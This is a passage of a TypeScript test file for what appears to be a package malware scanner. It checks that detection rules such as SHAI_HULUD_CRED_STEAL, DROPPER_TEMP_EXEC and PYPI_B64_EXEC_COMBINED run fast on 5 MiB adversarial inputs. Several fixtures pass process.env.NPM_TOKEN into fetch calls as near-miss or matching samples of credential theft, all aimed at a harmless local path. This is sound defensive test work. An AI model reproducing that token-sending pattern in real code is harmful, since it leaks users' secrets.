    const fiveMiB = 5 * 1024 * 1024;
    const prefix = "let token = process.env.NPM_TOKEN;\n";
    const assignment = "token = token;\n";
    const suffix = 'fetch("/ordinary", { body: "public" });\n';
    const repetitions = Math.floor((fiveMiB - prefix.length - suffix.length) / assignment.length);
    const padding = " ".repeat(
      fiveMiB - prefix.length - suffix.length - (repetitions * assignment.length),
    );
    const source = prefix + assignment.repeat(repetitions) + padding + suffix;
    expect(source).toHaveLength(fiveMiB);

    const started = performance.now();
    expect(matches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, source)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });
  it("stays under ten seconds on a 5 MiB chained-assignment near miss", { timeout: performanceBudget(15_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const chain = "credentialPayload=".repeat(4_096);
    const source = "process.env.NPM_TOKEN";
    const killAndSink =
      ';\ncredentialPayload = "public";\nfetch("/ordinary", { body: credentialPayload });\n';
    const padding = " ".repeat(
      fiveMiB - chain.length - source.length - killAndSink.length,
    );
    const content = chain + padding + source + killAndSink;
    expect(content).toHaveLength(fiveMiB);

    const started = performance.now();
    expect(matches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, content)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });
  it("propagates a large alias chain across a 5 MiB file in under ten seconds", { timeout: performanceBudget(15_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const aliases = ["let alias0 = process.env.NPM_TOKEN;\n"];
    for (let index = 1; index <= 4_096; index++) {
      aliases.push(`let alias${index} = alias${index - 1};\n`);
    }
    const prefix = aliases.join("");
    const suffix = 'fetch("/ordinary", { body: alias4096 });\n';
    const content = prefix + " ".repeat(fiveMiB - prefix.length - suffix.length) + suffix;
    expect(content).toHaveLength(fiveMiB);

    const started = performance.now();
    expectValidMatches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, content);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });
  it("discovers a nested lexical shadow across a 5 MiB initializer in under ten seconds", { timeout: performanceBudget(15_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const prefix = `const token = process.env.NPM_TOKEN;
const outer = () => {
  fetch("/ordinary", { body: token });
`;
    const declarations = Array.from(
      { length: 512 },
      (_, index) => `  const filler${index} = ${index};\n`,
    ).join("");
    const suffix = `  const token = "clean";
};
`;
    const content = prefix + declarations +
      " ".repeat(fiveMiB - prefix.length - declarations.length - suffix.length) + suffix;
    expect(content).toHaveLength(fiveMiB);

    const started = performance.now();
    expect(matches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, content)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });
  it("stays under ten seconds on a 5 MiB brace-heavy near miss", { timeout: performanceBudget(15_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const prefix = "const token = process.env.NPM_TOKEN;";
    const unit = "if (ready) {}";
    const suffix = 'fetch("/ordinary", { body: "public" });';
    const repetitions = Math.floor((fiveMiB - prefix.length - suffix.length) / unit.length);
    const content = prefix + unit.repeat(repetitions) +
      " ".repeat(fiveMiB - prefix.length - suffix.length - (unit.length * repetitions)) + suffix;
    expect(content).toHaveLength(fiveMiB);

    const started = performance.now();
    expect(matches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, content)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
  });
  it("stays near-linear on 5 MiB adversarial inputs", { timeout: performanceBudget(15_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const adversarial: Record<(typeof EXPECTED_RULES)[number], string> = {
      PYPI_B64_EXEC_COMBINED: "rm(".repeat(Math.ceil(fiveMiB / 3)).slice(0, fiveMiB),
      PYPI_CUSTOM_INSTALL: "cmdclass={".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      PYPI_CUSTOM_DEVELOP: "cmdclass={".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      PYPI_CUSTOM_EGG_INFO: "cmdclass={".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      PYPI_CUSTOM_SDIST: "cmdclass={".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      PYPI_CUSTOM_BUILD_EXT: "cmdclass={".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      SHAI_HULUD_CRED_STEAL: ("process.env.NPM_TOKEN;fetch(".repeat(Math.ceil(fiveMiB / 28))).slice(0, fiveMiB),
      PROTESTWARE_IP_GEO_V2: ("maxmind;" + "rm(".repeat(Math.ceil(fiveMiB / 3))).slice(0, fiveMiB),
      PROXY_HANDLER_TRAP: "new Proxy(".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
      DROPPER_TEMP_EXEC: "writeFile(".repeat(Math.ceil(fiveMiB / 10)).slice(0, fiveMiB),
    };

    const started = performance.now();
    for (const rule of EXPECTED_RULES) {
      expect(matches(CORRELATED_PATTERN_MATCHERS[rule], adversarial[rule])).toEqual([]);
    }
    const elapsed = performance.now() - started;
    expect(elapsed).toBeLessThan(performanceBudget(10_000));
  });
});